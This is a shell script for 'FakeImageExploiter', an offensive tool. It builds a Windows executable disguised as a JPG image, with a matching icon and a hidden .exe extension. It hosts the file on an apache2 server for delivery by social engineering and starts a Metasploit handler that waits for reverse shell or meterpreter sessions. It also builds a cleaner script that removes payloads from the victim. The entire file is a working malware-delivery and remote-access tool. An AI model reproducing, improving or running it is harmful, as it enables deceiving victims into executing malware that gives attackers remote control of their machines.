#!/bin/sh


##
# FakeImageExploiter v1.2 - image.jpg.exe
# Version: v1.2 (Beta)
# Author: pedro ubuntu [ r00t-3xp10it ]
# CodeName: Metamorphosis
# Distros Supported : Linux Ubuntu, Kali, Mint, Parrot OS
#
#
# Description:
#   This module takes one existing image.jpg and one payload.exe (input by user) and
#   builds a new payload (agent.jpg.exe) that if executed it will trigger the download
#   of the 2 previous files stored into apache2 webserver (image.jpg + payload.exe).
#   This module also changes the payload Icon to match the input image.jpg Then uses
#   'hides known file extensions' to hidde the .exe extension (final: agent.jpg.exe) ..
#
# Exploitation:
#   agent.jpg.exe final binary should be deliver to target using social enginnering
#   (apache2) As soon as the victim runs our executable, our picture will be downloaded
#   and opened in the default picture viewer, our malicious payload will be executed,
#   and we will get a meterpreter session.
#
#   'This tool also builds a cleaner.rc file to delete payloads left in target'
#   HINT: migrate to another process before using cleaner to delete payload.exe
#
#
# Credits: https://null-byte.wonderhowto.com/how-to/hide-virus-inside-fake-picture-0168183
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
##


#
# TODO: if does not execute payload.exe then use r3lik .txt payload ..
# TODO: config 'windows 7' using registry ...
#   .wine/system.reg
#   sed "s|\"ProductName\"=\"Microsoft Windows 8\"|\"ProductName\"=\"Microsoft Windows 7\"|" system.reg > copy.rc
#
# resize terminal window ..
resize -s 22 88 > /dev/null



#
# Colorise shell Script output leters
#
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



#
# Tool variable declarations
#
VeR="1.1" # tool version
ArCh=`arch` # store attackers arch
IPATH=`pwd` # store tool full path
HoME=`echo ~` # store home variable
CnA="Metamorphosis" # tool codename display
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
#
# Read options (configurations) from settings file ..
#
bYR=`cat $IPATH/settings | egrep -m 1 "BYPASS_RH" | cut -d '=' -f2` > /dev/null 2>&1 # bypass resource hacker funtion?
EtU=`cat $IPATH/settings | egrep -m 1 "EXTENSION_TO_USE" | cut -d '=' -f2` > /dev/null 2>&1 # store extension to use
PaLe=`cat $IPATH/settings | egrep -m 1 "PAYLOAD_EXTENSION" | cut -d '=' -f2` > /dev/null 2>&1 # store extension to use
ApAc=`cat $IPATH/settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1 # store apache2 webroot




#
# Config user system correct arch
#
if [ "$ArCh" = "i686" ]; then
dEd="x86"
arch="wine"
PgFi="Program Files"
ComP="i586-mingw32msvc-gcc"
else
dEd="x64"
arch="wine64"
PgFi="Program Files (x86)"
ComP="i686-w64-mingw32-gcc"
fi
#
# resource hacker install path (local)
#
RhI="$HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe"



#
# Grab Ip address to config apache2 URL and evil agent
#
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear



#
# check for dependencies Installed
# xterm, zenity, apache2, mingw32[64], ResourceHacker(wine)
#
Colors;
echo ${BlueF}[☆]${white} Checking backend applications ..${Reset};
sleep 1

# search for mingw32[64] intallation ..
apc=`which $ComP`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedF}[x]${white} mingw32 installation '->' not found!${Reset};
  sleep 1
  echo ${RedF}[x]${white} This script requires mingw32 to work${Reset};
  echo ${YellowF}[☆] Please wait: installing missing dependencies ..${Reset};
  echo ""
  sudo apt get-install $ComP
  echo ""
else
  echo ${BlueF}[☆]${white} mingw32 installation '->' found!${Reset};
  sleep 1
fi

# search for wine intallation ..
apc=`which wine`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedF}[x]${white} Wine installation '->' not found!${Reset};
  sleep 1
  echo ${RedF}[x]${white} This script requires wine to work${Reset};
  echo ${YellowF}[☆] Please wait: installing missing dependencies ..${Reset};
  echo ""
  sudo apt get-install wine
  echo ""
else
  echo ${BlueF}[☆]${white} Wine installation    '->' found!${Reset};
  sleep 1
fi

# search for xterm intallation ..
apc=`which xterm`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedF}[x]${white} Xterm installation '->' not found!${Reset};
  sleep 1
  echo ${RedF}[x]${white} This script requires xterm to work!${Reset};
  echo ${YellowF}[☆] Please wait: installing missing dependencies ..${Reset};
  echo ""
  sudo apt get-install xterm
  echo ""
else
  echo ${BlueF}[☆]${white} Xterm installation   '->' found!${Reset};
  sleep 1
fi

# search for zenity intallation ..
apc=`which zenity`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedF}[x]${white} Zenity installation '->' not found!${Reset};
  sleep 1
  echo ${RedF}[x]${white} This script requires Zenity to work!${Reset};
  echo ${YellowF}[☆] Please wait: installing missing dependencies ..${Reset};
  echo ""
  sudo apt get-install zenity
  echo ""
else
  echo ${BlueF}[☆]${white} Zenity installation  '->' found!${Reset};
  sleep 1
fi

# search for wine drive_c folder intallation ..
if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
  echo ${BlueF}[☆]${white} Wine Program Files   '->' found!${Reset};
  sleep 1
else
  FaIl="YES"
  echo ${RedF}[x]${white} Wine $PgFi '->' not found!${Reset};
  echo ${RedF}[x]${white} $HoME/.wine/drive_c/$PgFi ${Reset};
  sleep 1
  echo ${YellowF}[☆] Please wait, running winecfg!${Reset};
  winecfg > /dev/null 2>&1
  sleep 1
fi



#
# Restart tool after dependencies installs
#
sleep 2
if [ "$FaIl" = "YES" ]; then
  echo ${YellowF}[☆] FakeImageExploiter needs to restart to finish installs ..${Reset};
  sleep 2
  exit
fi



#
# BANNER DISPLAY (run or abort)
#
clear
cat << !

    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-----+
    |F|a|k|e|I|m|a|g|e|E|x|p|l|o|i|t|e|r| v$VeR|
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-----+

    Extension sellected: .$EtU (picture)
    Extension sellected: .$PaLe (payload)
   'Config settings file to use other extensions'

!
#
# chose to run or to abort framework execution ..
#
rUn=$(zenity --question --title="☠ FakeImageExploiter ☠" --text "Execute framework?" --width 270) > /dev/null 2>&1
  if [ "$?" -eq "0" ]; then
    service apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    service postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  else
    clear
    echo ""
    # abort tool execution ..
    echo ${white}    Codename${RedF}::${white}$CnA ${Reset};
    echo ${white}    Author${RedF}::${white}pedr0 ubuntu${RedF}::${white}[r00t-3xp10it]${Reset};
    echo ${white}    FakeImageExploiter${RedF}::${white}v$VeR${RedF}::${white}SuspiciousShellActivity©${RedF}::${white}RedTeam${RedF}::${white}2017${Reset};
    echo ""
    sleep 1
    exit
  fi



#
# Questions to user (zenity)
#
# orginal payload full-path variable
UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
# orginal image.jpg full-path variable
JpG=$(zenity --title "☠ IMAGE TO BE USED (only .$EtU) ☠" --filename=$IPATH --file-selection --text "chose image to use.") > /dev/null 2>&1
# icon to use in agent.jpg.exe (or image.jpg)
IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPGblack.ico" FALSE "JPGwhite.ico" FALSE "JPGgreen.ico" FALSE "JPGblank.ico" FALSE "JPGorange.ico" FALSE "JPGfoto.ico" FALSE "Input your own image" --width 330 --height 310) > /dev/null 2>&1
# chose to input your own image insted of a icon
if [ "$IcOn" = "Input your own image" ]; then
  ImR=$(zenity --title "☠ IMAGE TO BE USED AS ICON ☠" --filename=$IPATH --file-selection --text "chose image to use") > /dev/null 2>&1
  PaTh="$ImR"
else
  PaTh="$IPATH/icons/$IcOn"
fi
# rename your exploiter (trigger)
MiP=$(zenity --title "☠ PAYLOAD FINAL NAME ☠" --text "example: screenshot" --entry --width 300) > /dev/null 2>&1
clear
cat << !

    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-----+
    |F|a|k|e|I|m|a|g|e|E|x|p|l|o|i|t|e|r| v$VeR|
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-----+

!
#
# build evil agent C binary
#
cd $IPATH/bin
echo ${BlueF}[☆]${white} Building : evil agent ..${Reset};
sed "s|LhOsT|$IP|g" evil.c > evilcopy.c
sed -i "s|ScRee|$MiP.$EtU|g" evilcopy.c
sed -i "s|EhLh|$PaLe|g" evilcopy.c



#
# Compiling agent using mingw32[64] (gcc)
# WARNING: this funtion only compiles 32bites payloads
# GCC    : i586-mingw32msvc-gcc OR i686-w64-mingw32-gcc
#
echo ${BlueF}[☆]${white} Compiling: agent using mingw32 ..${Reset};
sleep 2
$ComP evilcopy.c -o trigger.exe -lws2_32 -mwindows
mv trigger.exe $IPATH/output/trigger.exe > /dev/null 2>&1
cd $IPATH



#
# Run or abort ResourceHacker use (BYPASS_RH)
# This funtion allow you to use another editor to change icons ..
#
if [ "$bYR" = "YES" ]; then
  echo ${YellowF}[☆] Manually change icon.ico sellected ..${Reset};
  echo ${YellowF}[☆] Use your favorite editor to change icon [trigger.exe]${Reset};
  echo -n "[+] And then press Continue? (y/n):"
  read op

else

  #
  # check for resource hacker installation (wine)
  # WARNING: change this path to suite your needs in settings file.
  #
  if [ -f "$RhI" ]; then
    echo ${BlueF}[☆]${white} ResourceHacker.exe: found ..${Reset};
    sleep 1
    #
    # wine command to call resourcehacker and add a icon.ico to the 'trigger'
    #
    echo ${YellowF}[☠] WARNING:${white} WINE needs to be set to windows 7 ..${Reset};
    echo ${BlueF}[☆]${white} Working: In backdoor agent ..${Reset};
    sleep 1
    $arch "$RhI" -open $IPATH/output/trigger.exe -save $IPATH/output/agent.exe -action addskip -res "$PaTh" -mask ICONGROUP,MAINICON,
    echo ${BlueF}[☆]${white} Change : backdoor agent icons ..${Reset};
    sleep 1

  else

    #
    # Resource-Hacker Installation under WINE ..
    #
    echo ${RedF}[x]${white} ResourceHacker.exe '->' not found!${Reset};
    sleep 1
cat << !

    Installing ResourceHacker under .wine directorys... 
    Version:windows7 Arch:$dEd Path:drive_c/$PgFi
    $RhI

!
    sleep 3
    xterm -T "FakeImageExploiter" -geometry 90x26 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
    echo ${YellowF}[☆] Please wait, restarting tool ..${Reset};
    echo ${YellowF}[☆] For proper ResourceHacker.exe Instalation!${Reset};
    sleep 2
    exit

  fi
fi



  #
  # change trigger extension
  #
  echo ${BlueF}[☆]${white} Change : backdoor agent extension ..${Reset};
  mv $IPATH/output/agent.exe  $IPATH/output/$MiP.$EtU.exe > /dev/null 2>&1
  sleep 2


    #
    # port to apache2 (zip trigger.jpg.exe)
    #
    echo ${BlueF}[☆]${white} Port: all files to apache2 webserver ..${Reset};
    cp $UpL $ApAc/payload.$PaLe > /dev/null 2>&1
    cp $JpG $ApAc/$MiP.$EtU > /dev/null 2>&1
    sleep 2
    echo ${BlueF}[☆]${white} Creating: archive $MiP.zip ..${Reset};
    cd $IPATH/output
    zip $MiP.zip $MiP.$EtU.exe > /dev/null 2>&1
    mv $MiP.zip $ApAc/$MiP.zip > /dev/null 2>&1
    cd $IPATH
    sleep 2


      #
      # Build cleanner resource file (cleanner.rc)
      # WARNING: This RC file must be called manually from meterpreter prompt
      #
      echo ${BlueF}[☆]${white} Creating: resource cleaner.rc ..${Reset};
      sleep 2
      cd $IPATH/bin
      sed "s|EbbE|$PaLe|g" cleaner.rc > copy.rc
      sed -i "s|FaaF|$MiP|g" copy.rc
      sed -i "s|AssA|$EtU|g" copy.rc
      mv copy.rc $IPATH/output/cleaner.rc > /dev/null 2>&1
      cd $IPATH


        #
        # Start metasploit multi-handler ..
        # WARNING: agent.jpg.exe will be ziped (zip) for apache2 use, because
        # it raises less suspicious to use an URL http://IP/image.zip that
        # use URL http://IP/image.jpg.exe to deliver payload using apache2
        #
        # input handler settings [metasploit]
        echo ${BlueF}[☠]${white} Metamorphosis: completed ..${Reset};
        rm $IPATH/output/trigger.exe > /dev/null 2>&1
        sleep 2
        lhost=$(zenity --title="☠ Enter binary.exe LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
        lport=$(zenity --title="☠ Enter binary.exe LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
        # input payload (uploaded) choise
        paylo=$(zenity --list --title "☠ FakeImageExploiter ☠" --text "\nChose payload used by binary.exe:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
        # attack vector (apache2 webserver)
        echo ""
        echo ${RedF}"    ATTACK VECTOR: http://$IP/$MiP.zip"${Reset};
        echo ${RedF}"    AGENT: FakeImageExploiter/output/$MiP.$EtU.exe"${Reset};
        echo ${RedF}"    CLEAN: meterpreter > resource $IPATH/output/cleaner.rc"${Reset};
        sleep 1
        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"


      #
      # Clean all things up ..
      #
      rm $ApAc/$MiP.$EtU > /dev/null 2>&1
      rm $ApAc/$MiP.zip > /dev/null 2>&1
      rm $ApAc/payload.$PaLe > /dev/null 2>&1
      rm $ApAc/$MiP.$EtU.exe > /dev/null 2>&1
      rm $IPATH/bin/evilcopy.c > /dev/null 2>&1
      rm $IPATH/output/trigger.exe > /dev/null 2>&1
      sleep 2

    #
    # Exit framework ..
    #
    echo ""
    echo ${white}    Codename${RedF}::${white}$CnA ${Reset};
    echo ${white}    Author${RedF}::${white}pedr0 ubuntu${RedF}::${white}[r00t-3xp10it]${Reset};
    echo ${white}    FakeImageExploiter${RedF}::${white}v$VeR${RedF}::${white}SuspiciousShellActivity©${RedF}::${white}RedTeam${RedF}::${white}2017${Reset};
    echo ""
    sleep 1
    service apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
exit


